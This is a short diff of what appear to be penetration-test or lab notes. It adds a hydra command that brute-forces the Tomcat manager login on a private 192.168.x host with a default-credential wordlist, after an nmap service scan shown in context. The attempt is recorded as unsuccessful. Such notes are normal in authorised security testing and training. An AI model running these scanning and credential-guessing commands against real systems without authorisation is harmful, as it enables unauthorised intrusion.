@@ -8,6 +8,8 @@ nmap -p- -sV -sC -Pn 192.168.102.102 --open
 
 port 8080 open apache tomcat 8.5.91, tried with default usernames
 
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://192.168.102.101:8080/manager/html - Unsuccessful
+
 
 
 192.168.102.100 - entry point
